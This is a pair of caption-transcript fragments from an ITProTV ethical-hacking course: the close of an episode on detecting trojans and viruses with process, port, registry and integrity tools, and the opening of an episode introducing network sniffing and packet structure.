sites,\n\n640\n00:30:08.890 --> 00:30:11.150\nI try to show you either\ntools that are free or\n\n641\n00:30:11.150 --> 00:30:14.780\ntools you can demo that you can then\ndecide you wanna use and maybe buy.\n\n642\n00:30:14.780 --> 00:30:17.980\nWe really go out of our way to try to\nmake sure you get access to tools and\n\n643\n00:30:17.980 --> 00:30:22.260\nsee demos that will show you how these\ntools will work to give you a sense of\n\n644\n00:30:22.260 --> 00:30:23.164\nwhat is going on.\n\n645\n00:30:23.164 --> 00:30:25.742\nThere's always probably 10, 20,\n\n646\n00:30:25.742 --> 00:30:28.830\n30 different ways to do any\nof the things we do here.\n\n647\n00:30:28.830 --> 00:30:31.340\nAnd if you have a better tool,\nif you have a better website,\n\n648\n00:30:31.340 --> 00:30:35.420\nif there is something out there,\nyou think would be either as good or\n\n649\n00:30:35.420 --> 00:30:37.300\nbetter than what we try,\nthen go with that.\n\n650\n00:30:37.300 --> 00:30:39.590\nI mean there's nothing wrong\nwith doing those things.\n\n651\n00:30:39.590 --> 00:30:42.970\nBut we can't obviously demo everything and\nwe'd be here all day\n\n652\n00:30:42.970 --> 00:30:46.120\nliterally just doing nothing but demos and\ntalking about the value of every tool.\n\n653\n00:30:46.120 --> 00:30:49.094\nSo you have to understand that as\nan ethical hacker is any security\n\n654\n00:30:49.094 --> 00:30:49.859\nprofessional.\n\n655\n00:30:49.859 --> 00:30:53.027\nYou have to build your toolbox and figure\nout what it is you think will be good for\n\n656\n00:30:53.027 --> 00:30:55.237\nyou and those are the things\nyou wanna go with, right?\n\n657\n00:30:55.237 --> 00:30:59.037\nThose are the things that ultimately\nwill make the most sense for you and\n\n658\n00:30:59.037 --> 00:31:00.910\nare gonna be valuable for you.\n\n659\n00:31:00.910 --> 00:31:04.710\nI'm always on the lookout when I meet with\nclients and when I talk to students and\n\n660\n00:31:04.710 --> 00:31:06.240\nI do work for people.\n\n661\n00:31:06.240 --> 00:31:08.760\nIf they have a better tool or\na tool that I haven't seen or if they say,\n\n662\n00:31:08.760 --> 00:31:10.470\nhey what do you think about this?\n\n663\n00:31:10.470 --> 00:31:13.510\nAnd I haven't heard about it before that's\nwhat I wanna find out about because\n\n664\n00:31:13.510 --> 00:31:17.140\nmaybe that's something I'm gonna recommend\nor I'm gonna wanna use going forward.\n\n665\n00:31:17.140 --> 00:31:20.570\nBut I also hear about a lot of stuff that\ndoesn't work well that people say, hey,\n\n666\n00:31:20.570 --> 00:31:21.710\nhave you heard of this?\n\n667\n00:31:21.710 --> 00:31:24.260\nAnd I'll say, yeah, I've heard about\nthis or that and they say, yeah,\n\n668\n00:31:24.260 --> 00:31:26.440\nwell we used that and\nthat didn't work very well.\n\n669\n00:31:26.440 --> 00:31:27.740\nAnd so we wanna know, right?\n\n670\n00:31:27.740 --> 00:31:29.890\nThat there's always\nthese opportunities for\n\n671\n00:31:29.890 --> 00:31:32.317\nus to be on the lookout for things, right?\n\n672\n00:31:32.317 --> 00:31:33.770\nAnd reinvent the wheel.\n\n673\n00:31:33.770 --> 00:31:35.390\nWoe to the person ultimately, right?\n\n674\n00:31:35.390 --> 00:31:37.340\nThat's only going to be able to use one or\n\n675\n00:31:37.340 --> 00:31:40.240\ntwo tools because obviously,\nthere's not a lot of value in that, right?\n\n676\n00:31:40.240 --> 00:31:42.437\nWe're gonna essentially\nrun into a problem.\n\n677\n00:31:42.437 --> 00:31:44.656\nSo how do we detect a trojan,\nwhat do we do?\n\n678\n00:31:44.656 --> 00:31:45.494\nLet's just talk for\n\n679\n00:31:45.494 --> 00:31:48.115\na minute hypothetically\nabout what the steps may be.\n\n680\n00:31:48.115 --> 00:31:50.160\nSo we talked about what\nthe life cycle of a virus is,\n\n681\n00:31:50.160 --> 00:31:51.610\nwe said we gotta write it first, right?\n\n682\n00:31:51.610 --> 00:31:54.030\nThen we gotta figure out how\nto start getting it out there.\n\n683\n00:31:54.030 --> 00:31:57.747\nWhen we're looking for trojans,\nwe're looking for remote control software,\n\n684\n00:31:57.747 --> 00:31:59.449\nwe're looking for telltale signs.\n\n685\n00:31:59.449 --> 00:32:02.540\nOne of the most important things we\ncan do is scan the system, looking for\n\n686\n00:32:02.540 --> 00:32:04.430\nports that are open communicator, right?\n\n687\n00:32:04.430 --> 00:32:05.826\nBecause when we look for\nopen ports, we're looking for\n\n688\n00:32:05.826 --> 00:32:06.696\nthe command and control vectors.\n\n689\n00:32:06.696 --> 00:32:10.855\nWe're looking for that system\nsoftware trying to phone home or\n\n690\n00:32:10.855 --> 00:32:13.758\ntrying to connect to something or\nyou know,\n\n691\n00:32:13.758 --> 00:32:19.260\ntalking to some area outside the system\nthat we may not normally communicate with.\n\n692\n00:32:19.260 --> 00:32:22.420\nAnd so\ntell tale signs typically are going to be\n\n693\n00:32:22.420 --> 00:32:25.450\nrunning processes that\ndon't normally show up and\n\n694\n00:32:25.450 --> 00:32:29.160\nor open ports that are randomly\ncommunicated that we don't normally see.\n\n695\n00:32:29.160 --> 00:32:32.570\nOdd protocol's that we're normally used\nto see as well would be important.\n\n696\n00:32:32.570 --> 00:32:36.336\nWe've talked a lot in the some of\nthe other episodes about the fact that you\n\n697\n00:32:36.336 --> 00:32:39.861\nbeing skeptical from a security stand\npoint is always a good thing and\n\n698\n00:32:39.861 --> 00:32:40.804\na good approach.\n\n699\n00:32:40.804 --> 00:32:43.690\nAnd I talk to customers and\nstudents about this all the time.\n\n700\n00:32:43.690 --> 00:32:47.580\nWe spend a lot of time focusing on\nbuilding our security perimeters, right?\n\n701\n00:32:47.580 --> 00:32:51.290\nWe often talk about defense in-depth,\nand protection boundaries, and\n\n702\n00:32:51.290 --> 00:32:54.620\nthe fact that we should always be looking\nfor what's trying to come in against us.\n\n703\n00:32:54.620 --> 00:32:57.350\nBut I often remind everybody that\nit's not just what's outside.\n\n704\n00:32:57.350 --> 00:33:01.510\nAs a matter of fact, studies show that\nmost of the hacking activity that takes\n\n705\n00:33:01.510 --> 00:33:05.250\nplace successfully against us Is coming\nfrom inside our protection boundary and\n\n706\n00:33:05.250 --> 00:33:06.290\nnot outside.\n\n707\n00:33:06.290 --> 00:33:09.680\nWhich means that we're seeing\neffects from inside, right?\n\n708\n00:33:09.680 --> 00:33:13.220\nBad actors behind the firewall,\nbehind the protection screens.\n\n709\n00:33:13.220 --> 00:33:15.020\nOur own people in other words, right?\n\n710\n00:33:15.020 --> 00:33:15.547\nAre up to no good.\n\n711\n00:33:15.547 --> 00:33:19.940\nAnd what we often miss is the fact\nthat we're not scanning internally and\n\n712\n00:33:19.940 --> 00:33:24.692\nnot often looking inside as carefully\nbecause we assume incorrect quite often\n\n713\n00:33:24.692 --> 00:33:28.700\nthat the majority of activity's\ngonna come from outside.\n\n714\n00:33:28.700 --> 00:33:31.147\nAnd so the bulk of our defenses focused,\nright?\n\n715\n00:33:31.147 --> 00:33:32.920\n&gt;&gt; Right.\n&gt;&gt; Kinda outward-facing.\n\n716\n00:33:32.920 --> 00:33:36.460\nAnd we have to turn and pivot,\nand really look internally, or\n\n717\n00:33:36.460 --> 00:33:38.830\nat least be equally vigilant,\nlet's say, right?\n\n718\n00:33:38.830 --> 00:33:40.795\nI'm not suggesting for\na minute we ignore the outer parameter.\n\n719\n00:33:40.795 --> 00:33:44.920\nI think there's a very, very big\nproblem if all you do is look inside.\n\n720\n00:33:44.920 --> 00:33:46.480\nJust like there's a big problem\nif all you do is look outside.\n\n721\n00:33:46.480 --> 00:33:47.900\nI think you need to do both.\n\n722\n00:33:47.900 --> 00:33:50.337\nAnd I think you need to\nsplit that vigilance and\n\n723\n00:33:50.337 --> 00:33:53.350\nhave systems that scan both internally and\nexternally.\n\n724\n00:33:53.350 --> 00:33:56.960\nBut we've gotta look for\nrandom and bizarre port calls.\n\n725\n00:33:56.960 --> 00:33:58.960\nRandom and bizarre protocol traffic.\n\n726\n00:33:58.960 --> 00:34:01.339\nSuspicious processes that are running.\n\n727\n00:34:01.339 --> 00:34:03.666\nThis is another thing\nthat ethical hackers,\n\n728\n00:34:03.666 --> 00:34:07.090\nand Windows based system admins\ntoday have to also consider.\n\n729\n00:34:07.090 --> 00:34:08.660\nWe have to stop fearing the command line.\n\n730\n00:34:08.660 --> 00:34:12.067\nWhich is another big issue that\nWindows admins unfortunately,\n\n731\n00:34:12.067 --> 00:34:15.407\neven today still have right,\nI mean we just, we've grown up,\n\n732\n00:34:15.407 --> 00:34:19.210\ndepending on how old you are and\nhow grey and long in the tooth you may be.\n\n733\n00:34:19.210 --> 00:34:23.512\nWe have grown up knowing that Windows is\na graphical environment and that Linux and\n\n734\n00:34:23.512 --> 00:34:27.150\nUnix was that other world that most\nof us never really played with.\n\n735\n00:34:27.150 --> 00:34:27.820\nRight?\n\n736\n00:34:27.820 --> 00:34:30.250\nAnd for years, right?\n\n737\n00:34:30.250 --> 00:34:34.204\nFrom Linux and Unix admins and those\npeople that have work in those systems\n\n738\n00:34:34.204 --> 00:34:38.361\nhave been saying and rightly so, the\nbiggest down fall of Windows is the GUI.\n\n739\n00:34:38.361 --> 00:34:41.813\nAnd they're absolutely right, and\nwe're moving and pivoting to fix that\n\n740\n00:34:41.813 --> 00:34:45.530\nwith things like PowerShell and\nWindows Core and all the stuff we can do.\n\n741\n00:34:45.530 --> 00:34:48.580\nBut the reality is, if you're not\ngetting comfortable in the command line,\n\n742\n00:34:48.580 --> 00:34:51.460\nyou're not gonna be able to do\nsome of the things you need to do.\n\n743\n00:34:51.460 --> 00:34:54.854\nFor instance,\nyou may use something like Task Manager,\n\n744\n00:34:54.854 --> 00:34:59.800\nwhich is a GUI based process list tool\nthat we've relied on forever in Windows.\n\n745\n00:34:59.800 --> 00:35:03.940\nThe problem is, many of these pieces\nof software hide from task manager,\n\n746\n00:35:03.940 --> 00:35:07.180\nunless you're using something like list,\nor top, or proc,\n\n747\n00:35:07.180 --> 00:35:11.930\nwhich are units Linux command line tools\nthat do essentially the same thing.\n\n748\n00:35:11.930 --> 00:35:14.020\nYou can use P list,\nwhich is assist internals,\n\n749\n00:35:14.020 --> 00:35:17.590\ninternals tool set tool\nto list all processes.\n\n750\n00:35:17.590 --> 00:35:21.288\nIf you're using one of those tools, you're\ngonna see processes that are running\n\n751\n00:35:21.288 --> 00:35:23.280\nthat don't show up in task manager.\n\n752\n00:35:23.280 --> 00:35:26.490\nAnd that's what you've gotta be doing\nto examine for things like trojans and\n\n753\n00:35:26.490 --> 00:35:31.680\nultimately for viruses on these particular\nsystems, scan for suspicious ports\n\n754\n00:35:31.680 --> 00:35:34.970\nmake sure you understand what kind of\noutbound traffic is happening there.\n\n755\n00:35:34.970 --> 00:35:38.620\nTools like TCP view curve ports or\nany of the tools that we've demoed and\n\n756\n00:35:38.620 --> 00:35:42.090\nwe've looked at curve ports short for\ncurrent ports in prior episodes.\n\n757\n00:35:42.090 --> 00:35:46.250\nWe've looked at a lot of that, look at\nprocess managers like what's running or\n\n758\n00:35:46.250 --> 00:35:47.270\nprocman.\n\n759\n00:35:47.270 --> 00:35:50.680\nThere's all these different one out\nthere that are gonna show these to you.\n\n760\n00:35:50.680 --> 00:35:53.200\nLook at the registry and\nlook for suspicious services or\n\n761\n00:35:53.200 --> 00:35:54.800\nentries in the registry.\n\n762\n00:35:54.800 --> 00:35:57.290\nSomebody who would understand\nhow to do this and\n\n763\n00:35:57.290 --> 00:36:01.260\nis thinking about this would be looking\nat baselining a system that's clean.\n\n764\n00:36:01.260 --> 00:36:04.510\nAnd then going through and doing a quick\ncompare and contrast on the registry to\n\n765\n00:36:04.510 --> 00:36:08.120\nlook for entries that are essentially\nweird, that don't belong there.\n\n766\n00:36:08.120 --> 00:36:11.030\nAnd so RegScanner, a good tool for\nthe registry, for instance, right,\n\n767\n00:36:11.030 --> 00:36:14.580\nto do a quick comparison, maybe used\nthere, there's all these different ones.\n\n768\n00:36:14.580 --> 00:36:19.546\nThere's Active Registry Monitor,\nReg Shot, Alien Registry Viewer.\n\n769\n00:36:19.546 --> 00:36:20.046\nI love all Seeing Eyes.\n&gt;&gt; [LAUGH]\n\n770\n00:36:20.046 --> 00:36:20.796\n&gt;&gt; Right?\n\n771\n00:36:20.796 --> 00:36:22.288\nThere's all these different ones\n\n772\n00:36:22.288 --> 00:36:22.930\nout there.\n\n773\n00:36:22.930 --> 00:36:24.730\nYou're looking at\nsuspicious device drivers.\n\n774\n00:36:24.730 --> 00:36:28.930\nI know I've shown you before and\nvarious demonstrations we've done.\n\n775\n00:36:28.930 --> 00:36:30.130\nAnd looking at that.\n\n776\n00:36:30.130 --> 00:36:31.960\nGoing to MS Info 32.\n\n777\n00:36:31.960 --> 00:36:33.860\nAnd look at the system drivers\nthat are listed there.\n\n778\n00:36:33.860 --> 00:36:36.620\nLook for suspicious activity\non Windows system, right.\n\n779\n00:36:36.620 --> 00:36:40.420\nI know you can't demo that on yours, but\njust thinking about that kinda stuff.\n\n780\n00:36:40.420 --> 00:36:43.370\nAs I mentioned Sigverif which is\na Windows tool that will allow\n\n781\n00:36:43.370 --> 00:36:47.930\nyou to got to look at the dlls and the\ndigital signatures and all the core dlls.\n\n782\n00:36:47.930 --> 00:36:48.610\nDriver view.\n\n783\n00:36:48.610 --> 00:36:52.490\nThere's all these different\ntools in there that can go in.\n\n784\n00:36:52.490 --> 00:36:53.950\nLook for suspicious services.\n\n785\n00:36:53.950 --> 00:36:56.580\nYou know these are just\nthe tip of the iceberg right?\n\n786\n00:36:56.580 --> 00:36:58.340\nBut these are the kind of things\nthat you should be doing and\n\n787\n00:36:58.340 --> 00:37:01.560\nby the way the equivalence in Linux and\nUnix as I said.\n\n788\n00:37:01.560 --> 00:37:02.753\nAre also very important.\n\n789\n00:37:02.753 --> 00:37:07.980\nScanning and looking at what starts up or\nwhat runs at startup is equally important.\n\n790\n00:37:07.980 --> 00:37:09.870\nLooking at the registry entries,\nas I said,\n\n791\n00:37:09.870 --> 00:37:11.820\nby going in and\nlooking at what's in there.\n\n792\n00:37:11.820 --> 00:37:16.910\nThe categories like what's in the Windows\nStartup directory so HQLM software.\n\n793\n00:37:16.910 --> 00:37:19.732\nMicrosoft Windows current vision,\ncurrent vision excuse me.\n\n794\n00:37:19.732 --> 00:37:22.310\n&gt;&gt; [LAUGH]\n&gt;&gt; Current version run.\n\n795\n00:37:22.310 --> 00:37:26.847\nOr current version run once right is where\nyou're gonna look in local machine and\n\n796\n00:37:26.847 --> 00:37:27.988\nh key current user.\n\n797\n00:37:27.988 --> 00:37:30.550\nGoing in and looking at h key lm.\n\n798\n00:37:30.550 --> 00:37:33.950\nSoftware and Microsoft Windows current\nversion explorer shell, folders,\n\n799\n00:37:33.950 --> 00:37:34.960\ncommon startup.\n\n800\n00:37:34.960 --> 00:37:37.770\nRight those are kind of the paths\nyou would start to look at\n\n801\n00:37:37.770 --> 00:37:38.740\nIn the registries, right.\n\n802\n00:37:38.740 --> 00:37:42.060\nIn both the local machine and\ncurrent user keys.\n\n803\n00:37:43.080 --> 00:37:46.057\nIE startups so\nlook at the registry entries for IE.\n\n804\n00:37:46.057 --> 00:37:51.035\nH key, HKCU, software,\nMicrosoft, Internet Explorer.\n\n805\n00:37:51.035 --> 00:37:56.873\nURL search hooks, toolbar, extensions,\nMenuExt, short for menu extension.\n\n806\n00:37:56.873 --> 00:38:00.335\nThese are all registry paths in the\nWindows systems going all the way back to\n\n807\n00:38:00.335 --> 00:38:04.010\nWindows XP in one form or another,\nslight variation in the path.\n\n808\n00:38:04.010 --> 00:38:06.654\nBut XP, NT4, Windows 2000,\nVista, 7, 8, 8.1, 10, whatever.\n\n809\n00:38:06.654 --> 00:38:11.246\nThose paths are gonna look very\nsimilar version to version and\n\n810\n00:38:11.246 --> 00:38:15.219\nbecause of that the bad actors\nobviously know that and\n\n811\n00:38:15.219 --> 00:38:19.040\nwe know that and\nwe should be looking at that.\n\n812\n00:38:19.040 --> 00:38:20.184\nTools like AutoRun, right?\n\n813\n00:38:20.184 --> 00:38:21.390\nAnd what's running in there.\n\n814\n00:38:21.390 --> 00:38:25.240\nOr in HijackThis, an oldie but a goodie\nif you remember HijackThis, right?\n\n815\n00:38:25.240 --> 00:38:27.860\nThat kinda stuff is\ngonna be very important.\n\n816\n00:38:27.860 --> 00:38:29.680\nWe talked about sigverif Tripwire,\n\n817\n00:38:29.680 --> 00:38:32.742\nanother good one you can use out\nthere as a file scanning tool.\n\n818\n00:38:32.742 --> 00:38:34.330\nYeah these are the kind of things.\n\n819\n00:38:34.330 --> 00:38:35.380\nFCIV.\n\n820\n00:38:35.380 --> 00:38:38.230\nWhich is a tool you can get from\nMicrosoft it's command line utility\n\n821\n00:38:38.230 --> 00:38:40.085\nthat essentially does what sig verif does.\n\n822\n00:38:40.085 --> 00:38:42.102\nBut it is just a command\nline version of that.\n\n823\n00:38:42.102 --> 00:38:44.440\nYou can download that from Microsoft.\n\n824\n00:38:44.440 --> 00:38:46.850\nAny or\nall of these tools are gonna be used.\n\n825\n00:38:46.850 --> 00:38:49.740\nYou can look at file and\nfolder integrity checkers.\n\n826\n00:38:49.740 --> 00:38:52.560\nYou know there's just all this different\nstuff that we can go out and look out.\n\n827\n00:38:52.560 --> 00:38:56.990\nBut scanning, integrity checking and\ninterception right are really gonna be\n\n828\n00:38:56.990 --> 00:38:59.810\nthe mechanisms that we want to think\nabout and we talked a little bit about\n\n829\n00:38:59.810 --> 00:39:03.980\ncode emulation in the sense we talked\nabout different testing types.\n\n830\n00:39:03.980 --> 00:39:05.340\nAnd I mentioned heuristics I think but\n\n831\n00:39:05.340 --> 00:39:07.490\nI don't think we really\ndiscussed the finer points here.\n\n832\n00:39:07.490 --> 00:39:09.730\nLet's just quickly talk\nabout this to wrap up.\n\n833\n00:39:09.730 --> 00:39:13.300\nThe code emulation with regards to virus\ndetection is really interesting is what we\n\n834\n00:39:13.300 --> 00:39:16.130\nessentially do there Is the anti-virus\n\n835\n00:39:16.130 --> 00:39:19.510\nsystem executes the malicious\ncode looking at what happens.\n\n836\n00:39:19.510 --> 00:39:20.890\nThis is dynamic, in other words.\n\n837\n00:39:20.890 --> 00:39:23.960\nSo we're gonna go in, and\nwe're gonna go in and execute the code and\n\n838\n00:39:23.960 --> 00:39:25.810\ndynamically look at it and examine it.\n\n839\n00:39:25.810 --> 00:39:29.740\nAnd then we're gonna see what\nhappens in a virtual memory bubble,\n\n840\n00:39:29.740 --> 00:39:31.590\nan isolated sandbox.\n\n841\n00:39:31.590 --> 00:39:34.550\nWe could then tell,\nbased on what's going on with that,\n\n842\n00:39:34.550 --> 00:39:37.820\nhow to attack the virus cuz we'll\nunderstand what code is executing.\n\n843\n00:39:37.820 --> 00:39:41.850\nIf it's a poly morph or a meta morph we\nmay be able to see how it changes and\n\n844\n00:39:41.850 --> 00:39:45.410\nwe may then be able to apply that\nknowledge to disinfecting the system.\n\n845\n00:39:45.410 --> 00:39:49.391\nSo this is essentially a dynamic\nexamination through code emulation.\n\n846\n00:39:49.391 --> 00:39:52.437\nAnd then your heuristic analysis\ncan either by static or dynamic.\n\n847\n00:39:52.437 --> 00:39:55.800\nAnd this allows us to go in and\nlook at the file format.\n\n848\n00:39:55.800 --> 00:39:59.680\nIf it's static, examining metadata and\ninformation about the shell and\n\n849\n00:39:59.680 --> 00:40:01.070\nthe wrapper of the system.\n\n850\n00:40:01.070 --> 00:40:03.690\nAnd then in dynamic analysis,\nwe do code emulation\n\n851\n00:40:03.690 --> 00:40:07.240\nto actually examine the code and,\nexcuse me, see it running in real time.\n\n852\n00:40:07.240 --> 00:40:09.235\nSo, again, we wanna be thinking\nabout these different approaches.\n\n853\n00:40:09.235 --> 00:40:13.620\nAnd, you know, just understanding how\nall these things can be brought to bear.\n\n854\n00:40:13.620 --> 00:40:16.367\nAll of these countermeasures,\nthings we've been talking about,\n\n855\n00:40:16.367 --> 00:40:19.564\nare incredibly important for us to be\nable to think about, as CEH candidates.\n\n856\n00:40:19.564 --> 00:40:20.210\nRight?\n\n857\n00:40:20.210 --> 00:40:21.670\nAs certified ethical hackers.\n\n858\n00:40:21.670 --> 00:40:24.170\nWe wanna be able to understand\nwhat to do if we're infected.\n\n859\n00:40:24.170 --> 00:40:27.369\nThe worst thing we can do when somebody\nsays hey I think we have a problem,\n\n860\n00:40:27.369 --> 00:40:28.376\nis not have an answer.\n\n861\n00:40:28.376 --> 00:40:32.320\nEven if we tried something that is\nineffective, you gotta start somewhere.\n\n862\n00:40:32.320 --> 00:40:35.180\nThe first thing you should do is\nisolate that system, unplug it,\n\n863\n00:40:35.180 --> 00:40:36.350\nshut the wireless card off.\n\n864\n00:40:36.350 --> 00:40:40.500\nPeople often forget, we have wireless and\nif you don't disable it, member of virus,\n\n865\n00:40:40.500 --> 00:40:43.520\na piece of anti malware\nmay be able to turn it on.\n\n866\n00:40:43.520 --> 00:40:46.200\nMake sure you disable wireless,\nmake sure you unplug it from the network,\n\n867\n00:40:46.200 --> 00:40:48.840\nand then based on that,\nstart to scan the system and\n\n868\n00:40:48.840 --> 00:40:51.680\ninteract with it to figure out\nwhat may went wrong, okay?\n\n869\n00:40:51.680 --> 00:40:55.310\n&gt;&gt; All right, Adam, again another great\nlook there as we wrap up our conversation\n\n870\n00:40:55.310 --> 00:40:59.310\non malware, threats, took a look at\na lot of different types of viruses.\n\n871\n00:40:59.310 --> 00:41:03.500\nTalked about that virus life cycle,\nwe talked about trojans and then some\n\n872\n00:41:03.500 --> 00:41:07.150\npreventative measures, ways that we can\ntry to counteract some of those threats.\n\n873\n00:41:07.150 --> 00:41:08.206\nSo we appreciate that.\n\n874\n00:41:08.206 --> 00:41:12.960\nWell everybody out there enjoyed watching,\nsigning off for ITPROTV, Im Mike Rodrick.\n\n875\n00:41:12.960 --> 00:41:15.774\n&gt;&gt; Im a TSR Terminate stay and\nresident programmer,\n\n876\n00:41:15.774 --> 00:41:17.720\nwhich means I'll be coming back.\n\n877\n00:41:17.720 --> 00:41:20.835\n&gt;&gt; We hope so, [LAUGH],\nwe'll see you soon.\n\n878\n00:41:20.835 --> 00:41:23.720\n[SOUND]\n\n",

[LAUGH] &gt;&gt; Glue, truffles,\n\n16\n00:00:42.482 --> 00:00:45.190\nall sorts of stuff could come\nup in that conversation.\n\n17\n00:00:45.190 --> 00:00:48.580\nAll right, so we're gonna talk\ngenerically, keeping it real and\n\n18\n00:00:48.580 --> 00:00:51.590\nalso keeping it pure here at ITProTV.\n\n19\n00:00:51.590 --> 00:00:53.370\nWe're gonna talk about\nnetwork sniffing and threats.\n\n20\n00:00:53.370 --> 00:00:55.900\nAnd so one of the things that's\ninteresting in this conversation, we've\n\n21\n00:00:55.900 --> 00:01:00.690\nhad a lot of preliminary conversations\nthat lead us up to some of these topics.\n\n22\n00:01:00.690 --> 00:01:05.430\nWe spent a lot of time talking about\nfootprinting and reconnaissance and\n\n23\n00:01:05.430 --> 00:01:09.510\nall the things, social engineering and all\nthe things we would do in prior episodes.\n\n24\n00:01:09.510 --> 00:01:14.040\nKind of around the beginning portion of\nthe knowledge in CEH, in the first four or\n\n25\n00:01:14.040 --> 00:01:18.100\nfive sections as we build\nout the methodology early on\n\n26\n00:01:18.100 --> 00:01:19.340\nof what it means to go through.\n\n27\n00:01:19.340 --> 00:01:23.610\nAnd figure out how to step by step,\nkind of engage\n\n28\n00:01:23.610 --> 00:01:27.020\nthe activities that hackers would\nnormally look at to build knowledge and\n\n29\n00:01:27.020 --> 00:01:29.892\nultimately gain advantage in our networks.\n\n30\n00:01:29.892 --> 00:01:33.780\nWe talked about some of the lateral\ninformation technology.\n\n31\n00:01:33.780 --> 00:01:35.890\nThings like the cloud, for instance.\n\n32\n00:01:35.890 --> 00:01:37.740\nWe had a great conversation\nabout cloud and\n\n33\n00:01:37.740 --> 00:01:42.950\ncloud computing and the impact of cloud\nwith regards to ethical hacking today.\n\n34\n00:01:42.950 --> 00:01:47.760\nWe've talked about malware and talked\nabout all the things that may go on there.\n\n35\n00:01:47.760 --> 00:01:49.450\nAnd we've got upcoming episodes of course,\n\n36\n00:01:49.450 --> 00:01:51.920\na variety of other things\nthat we'll take a look at.\n\n37\n00:01:51.920 --> 00:01:56.450\nWe'll talk about SQL injections, we'll\ntalk about web attacks and mobile and\n\n38\n00:01:56.450 --> 00:01:57.280\nwireless.\n\n39\n00:01:57.280 --> 00:01:59.210\nYou know just all of\nthe different areas and\n\n40\n00:01:59.210 --> 00:02:01.930\nall the things that go into this\nbecause you know, it is really\n\n41\n00:02:01.930 --> 00:02:05.400\na holistic approach that we talk about\nwith regards to ethical hacking.\n\n42\n00:02:05.400 --> 00:02:07.650\nWith regards to network security and\nsniffing and\n\n43\n00:02:07.650 --> 00:02:10.770\nthe threats associated with network\ntraffic and the information contained\n\n44\n00:02:10.770 --> 00:02:15.490\nwithin those packets is very\ncentral to everything we do.\n\n45\n00:02:15.490 --> 00:02:17.280\nAnd understanding conceptually,\n\n46\n00:02:17.280 --> 00:02:20.030\nwhich is what we're going to start with\nhere in a minute, and Mike's been kind\n\n47\n00:02:20.030 --> 00:02:24.550\nenough to do a little Picaso-esque\ndrawing of the network packet for us.\n\n48\n00:02:24.550 --> 00:02:27.840\nIn his blue period,\nI think, or did we go red?\n\n49\n00:02:27.840 --> 00:02:28.525\nIs it blue or red?\n\n50\n00:02:28.525 --> 00:02:29.201\n&gt;&gt; I think it's still blue.\n\n51\n00:02:29.201 --> 00:02:30.045\n&gt;&gt; It's still blue?\nOkay, so\n\n52\n00:02:30.045 --> 00:02:31.560\nwe'll be in Mike's blue period today.\n\n53\n00:02:31.560 --> 00:02:34.521\nSo we'll take a look at some\nof that in just a moment, and\n\n54\n00:02:34.521 --> 00:02:38.679\nwe're gonna take a look at how traffic\nflows into our old friend the OSI model,\n\n55\n00:02:38.679 --> 00:02:42.840\nhow we use and manipulate our knowledge\nof the OSI model to be able to understand\n\n56\n00:02:42.840 --> 00:02:46.082\nsniffing and what goes on at one\nof the layers in particular.\n\n57\n00:02:46.082 --> 00:02:48.735\nSeveral layers, but\none layer in particular of interest to us,\n\n58\n00:02:48.735 --> 00:02:49.970\nthe data link layer.\n\n59\n00:02:49.970 --> 00:02:53.960\nWe'll talk about not only MAC addresses\nbut also this concept of what's known as\n\n60\n00:02:53.960 --> 00:02:56.680\npromiscuous mode and\nwhy this is so important.\n\n61\n00:02:56.680 --> 00:03:00.220\nBut generically before we get there, let's\njust start by defining, conceptually,\n\n62\n00:03:00.220 --> 00:03:00.960\nwhat sniffing is.\n\n63\n00:03:00.960 --> 00:03:04.958\nSo when we talk about sniffing, Mike,\nwhat do you, from your perspective,\n\n64\n00:03:04.958 --> 00:03:08.168\nwhat do we think we want to tell\nour studio audience out there?\n\n65\n00:03:08.168 --> 00:03:10.730\nWhat's important about sniffing,\nwhat do they need to know?\n\n66\n00:03:10.730 --> 00:03:13.335\n&gt;&gt; Sniffing allows me to\ncapture the raw packets,\n\n67\n00:03:13.335 --> 00:03:16.212\nthe raw data that's traveling\nacross the network.\n\n68\n00:03:16.212 --> 00:03:18.789\nAnd with the proper tools,\nI can open those packets up and\n\n69\n00:03:18.789 --> 00:03:22.172\nI can see not just the data that's in\nthem but different flags that are set,\n\n70\n00:03:22.172 --> 00:03:24.790\nprotocols that are being used,\nthings like that.\n\n71\n00:03:24.790 --> 00:03:25.595\n&gt;&gt; All right, so absolutely.\n\n72\n00:03:25.595 --> 00:03:29.810\nSo very, very important,\nvery good general statement of what we do.\n\n73\n00:03:29.810 --> 00:03:31.370\nSniffing is essentially, literally,\n\n74\n00:03:31.370 --> 00:03:34.150\nI often talk about as reading the tea\nleaves of the network, right?\n\n75\n00:03:34.150 --> 00:03:37.970\nWe're looking at the data,\nas Mike said, in raw form, right?\n\n76\n00:03:37.970 --> 00:03:41.780\nSo we're looking at the data as it\nstreams through whatever gateway or\n\n77\n00:03:41.780 --> 00:03:44.110\nchoke point we choose to monitor from.\n\n78\n00:03:44.110 --> 00:03:48.198\nWhether it is a host-based or\nnetwork-based intrusion detection,\n\n79\n00:03:48.198 --> 00:03:51.592\nintrusion prevention,\nmonitoring system to some kind,\n\n80\n00:03:51.592 --> 00:03:54.517\nage-based running a piece\nof software on a host.\n\n81\n00:03:54.517 --> 00:03:57.626\nGathering traffic as it comes\nin uniquely to that interface,\n\n82\n00:03:57.626 --> 00:04:00.973\nbroadly across the entire network\non a subnet, through a switch or\n\n83\n00:04:00.973 --> 00:04:04.710\nwhat we'll come to define as\na spanned port, for instance, right?\n\n84\n00:04:04.710 --> 00:04:06.420\nWhere we're pulling all the data in.\n\n85\n00:04:06.420 --> 00:04:09.780\nOr some combination, oftentimes both,\nrunning for different reasons and\n\n86\n00:04:09.780 --> 00:04:12.060\ndifferent focuses in different areas.\n\n87\n00:04:12.060 --> 00:04:14.334\nWe're gonna be recording traffic.\n\n88\n00:04:14.334 --> 00:04:18.445\nWe often define it, and I didn't have\nyou draw out a data packet in real time,\n\n89\n00:04:18.445 --> 00:04:22.325\nand I don't know if you could freehand\none quickly or maybe you have one.\n\n90\n00:04:22.325 --> 00:04:24.347\nBut while I'm talking,\nmaybe if you can come up with, and\n\n91\n00:04:24.347 --> 00:04:26.070\nlet me just describe what I wanna show.\n\n92\n00:04:26.070 --> 00:04:29.694\nMaybe you could quickly come with the\ngeneral idea of what we look at when we\n\n93\n00:04:29.694 --> 00:04:31.575\nlook at the data packet is the header.\n\n94\n00:04:31.575 --> 00:04:33.800\nWe've got the data payload in the middle,\nright?\n\n95\n00:04:33.800 --> 00:04:34.440\nThe data frame, and\n\n96\n00:04:34.440 --> 00:04:37.290\nthen we have the trailer on the end where\nwe have error control and correction.\n\n97\n00:04:37.290 --> 00:04:39.720\nBut up in the front,\nwe've got all those things to identify.\n\n98\n00:04:39.720 --> 00:04:44.984\nThe flags, we probably have a 